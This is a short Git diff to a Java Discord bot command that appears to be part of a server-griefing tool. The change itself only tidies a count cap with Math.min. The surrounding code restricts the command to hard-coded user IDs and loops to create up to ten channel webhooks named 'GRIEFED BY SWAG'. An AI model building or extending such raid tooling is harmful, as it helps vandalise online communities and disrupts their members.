@@ -14,11 +14,7 @@ public class CreateWebhookCommand implements ICommand {
         if (!(event.getAuthor().getIdLong() == Core.OWNERID) && !event.getAuthor().getId().equalsIgnoreCase("725452437342912542")) {
             return;
         }
-        int input;
-        if (Integer.parseInt(args.get(0)) > 10)
-            input = 10;
-        else
-            input = Integer.parseInt(args.get(0));
+        int input = Math.min(Integer.parseInt(args.get(0)), 10);
         for (int i = 0; i < input; i++) {
             try {
                 event.getChannel().createWebhook("GRIEFED BY SWAG " + getRandom()).queue();
